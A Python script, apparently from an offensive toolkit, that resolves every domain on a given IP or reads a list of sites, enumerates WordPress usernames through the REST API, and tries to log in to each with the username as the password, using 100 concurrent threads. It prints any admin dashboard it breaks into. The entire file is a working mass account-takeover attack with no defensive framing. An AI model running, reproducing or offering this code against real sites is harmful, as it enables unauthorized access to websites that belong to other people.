#!/usr/bin/env python3
from tools.reverseip import reverse_ip
from concurrent.futures import ThreadPoolExecutor
import requests
import socket
import json
import sys
import os

def wp_user(url):
    try:
        urls = url + '?rest_route=/wp/v2/users'
        r = requests.get(urls, timeout = 5, verify = False)
        for x in json.loads(r.text):
            up = x['slug']
            yurl = url + 'wp-login.php'
            header = {'Connection': 'keep-alive',
                'Pragma': 'no-cache',
                'Cache-Control': 'no-cache',
                'Upgrade-Insecure-Requests': '1',
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/71.0.3578.98 Chrome/71.0.3578.98 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'en-US,en;q=0.9,id;q=0.8',
                'Cookie': 'wordpress_test_cookie=WP+Cookie+check'}
            wpadmin = url + 'wp-admin/'
            pos = requests.post(yurl, data = {'log': up, 'pwd': up, 'wp-submit': 'Log In', 'redirect_to': wpadmin, 'testcookie': 1}, headers = header, timeout = 5, verify = False)
            if 'dashboard' in pos.text:
                print('[+] {} => ({})'.format(wpadmin, up))
    except: pass

def prog():
    sys.stdout.flush()
    sys.stdout.write('[+] Scanning..\r')
    sys.stdout.flush()
    sys.stdout.write('[x] Scanning..\r')

def wpslug(ip, verbose):
    try:
        socket.inet_aton(ip)
    except:
        print('[!] Invalid address')
        return False
    executor = ThreadPoolExecutor(max_workers=100)
    futures = []
    data = reverse_ip(ip, verbose)
    for url in data:
        for pro in ['http://', 'https://']:
            u = pro + url + '/'
            a = executor.submit(wp_user, u)
            futures.append(a)

    while True:
        try:
            prog()
            cek = a.done()
            if cek == True: break
        except KeyboardInterrupt:
            print('\r[!] Exiting program ...')
            break

def wpslug_file(fil, verbose):
    if os.path.isfile(fil) == True:
        data = open(fil, 'r').read()
    else:
        print('[!] Invalid file')
        return False
    executor = ThreadPoolExecutor(max_workers=100)
    futures = []
    for url in data.split('\n'):
        for pro in ['http://', 'https://']:
            u = pro + url + '/'
            a = executor.submit(wp_user, u)
            futures.append(a)

    while True:
        try:
            prog()
            cek = a.done()
            if cek == True: break
        except KeyboardInterrupt:
            print('\r[!] Exiting program ...')
            break
